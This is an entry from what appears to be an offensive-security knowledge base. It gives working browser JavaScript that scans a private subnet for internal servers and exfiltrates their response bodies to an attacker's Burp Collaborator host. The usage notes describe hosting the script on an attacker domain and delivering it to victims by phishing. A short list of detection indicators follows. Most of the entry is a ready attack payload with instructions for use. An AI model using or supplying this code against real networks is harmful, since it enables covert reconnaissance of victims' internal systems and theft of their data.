---
id: 66442572-f71c-4633-b191-66018ade1981
type: code
language: javascript
verified: true
created_at: '2020-08-17T07:52:51.684415+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
tags:
  - CORS
  - network-scan
  - pivot
platforms:
  - Web
validated: true
---

# JavaScript-Local-Network-Scanner-For-CORS-Pivot

## Code

```javascript
<script>
var q = [], collaboratorURL = 'http://$collaboratorPayload';
for(i=1;i<=255;i++){
  q.push(
  function(url){
    return function(wait){
    fetchUrl(url,wait);
    }
  }('http://192.168.0.'+i+':8080'));
}
for(i=1;i<=20;i++){
  if(q.length)q.shift()(i*100);
}
function fetchUrl(url, wait){
  var controller = new AbortController(), signal = controller.signal;
  fetch(url, {signal}).then(r=>r.text().then(text=>
    {
    location = collaboratorURL + '?ip='+url.replace(/^http:\/\//,'')+'&code='+encodeURIComponent(text)+'&'+Date.now()
  }
  ))
  .catch(e => {
  if(q.length) {
    q.shift()(wait);
  }
  });
  setTimeout(x=>{
  controller.abort();
  if(q.length) {
    q.shift()(wait);
  }
  }, wait);
}
</script>
```

## Description

This JavaScript code performs an asynchronous scan of a local network subnet (e.g., 192.168.0.1-255 on port 8080) using the browser's fetch API. It queues requests with timeouts and aborts to avoid blocking, then exfiltrates successful responses (IP, response code, and body) to a Collaborator URL via a redirect. Designed for CORS misconfiguration exploits where the victim's browser can access internal resources.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $collaboratorPayload | Unique subdomain for Burp Collaborator (e.g., abc123.oastify.com) | abc123.oastify.com |

## Usage

Embed this script in an HTML page hosted on an attacker domain. Deliver via phishing to a victim with internal network access. The script runs in the victim's browser, scanning for active internal servers and sending results to the attacker's Collaborator for analysis. Adjust the IP range and port in the for loop as needed.

## Detection

- Browser developer tools or network logs showing multiple fetch requests to private IPs.
- Outbound DNS/HTTP requests to Collaborator-like domains from internal browsers.
- WAF alerts on anomalous CORS requests or redirects with encoded payloads.

## Related

- [[procedures/CORS-Misconfiguration-Leading-To-Internal-Network-Pivot]]
- [[tools/Burp-Suite]]
